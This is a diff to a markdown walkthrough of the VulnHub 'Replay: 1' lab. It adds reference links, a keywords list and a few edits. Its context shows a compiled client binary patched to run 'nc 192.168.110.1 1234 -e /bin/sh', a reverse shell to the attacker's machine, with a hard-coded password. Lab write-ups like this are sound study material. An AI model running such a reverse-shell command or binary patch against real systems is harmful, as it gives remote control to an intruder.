@@ -1,4 +1,6 @@
-https://www.vulnhub.com/entry/replay-1,278/
+<https://www.vulnhub.com/entry/replay-1,278/>
+
+<https://www.hackingarticles.in/replay-1-vulnhub-lab-walkthrough/>
 
 
 # Description
@@ -11,6 +13,10 @@ https://www.vulnhub.com/entry/replay-1,278/
 > - Hard: No Changelog.txt, no hex editor 
 > - Mid: Read Changelog.txt, no hex editor 
 > - Easy: Anything goes
+
+# Keywords
+
+python programmation, nuitka, python compiler, hardcoded, backdoor, modify hard code in a binary
 
 # Scan
 
@@ -128,7 +134,7 @@ https://www.vulnhub.com/entry/replay-1,278/
 ## Modify binary
 
 
-With the same length
+Keep the size of the application the same
 
     echo Hello World, you are currently running as: ;whoami
     nc 192.168.110.1 1234 -e /bin/sh;ls;ls -al;id;ls;whoami
@@ -140,6 +146,8 @@ With the same length
 
 # Execute the binary file and get reverse shell
 
+
+    sudo apt-get install python2.7-dev <== On Kali machine
     $ ./client.bin
     IP: 192.168.110.5
     Enter Password: qGQjwO4h6gh0TAIRNXuQcDu9Lqsyul
